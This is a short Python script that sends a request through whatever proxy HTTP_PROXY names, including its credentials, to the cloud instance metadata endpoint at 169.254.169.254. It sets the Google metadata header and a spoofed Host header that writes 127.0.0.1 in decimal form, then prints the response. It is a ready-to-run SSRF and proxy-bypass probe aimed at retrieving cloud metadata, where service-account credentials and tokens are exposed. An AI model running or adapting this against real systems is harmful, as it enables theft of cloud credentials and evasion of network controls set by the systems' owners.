#!/usr/bin/env python3
import os
import sys
import urllib.parse
import requests

def main():
    http_proxy = os.environ.get("HTTP_PROXY") or os.environ.get("http_proxy")
    if not http_proxy:
        print("HTTP_PROXY not set", file=sys.stderr)
        sys.exit(1)

    # Parse proxy URL
    parsed = urllib.parse.urlparse(http_proxy)

    proxy_host = parsed.hostname
    proxy_port = parsed.port
    proxy_user = urllib.parse.unquote(parsed.username) if parsed.username else None
    proxy_pass = urllib.parse.unquote(parsed.password) if parsed.password else None

    if not proxy_host or not proxy_port:
        print("Invalid HTTP_PROXY format", file=sys.stderr)
        sys.exit(1)

    proxy_url = f"http://{proxy_host}:{proxy_port}"

    proxies = {
        "http": proxy_url,
        "https": proxy_url,
    }

    headers = {
        "Host": "2130706433:15004",
        "Metadata-Flavor": "Google",
    }

    auth = None
    if proxy_user is not None:
        auth = requests.auth.HTTPProxyAuth(proxy_user, proxy_pass or "")

    url = "http://169.254.169.254/computeMetadata/v1/"

    resp = requests.get(
        url,
        headers=headers,
        proxies=proxies,
        auth=auth,
        timeout=10,
    )

    print("Status:", resp.status_code)
    print(resp.text)

if __name__ == "__main__":
    main()
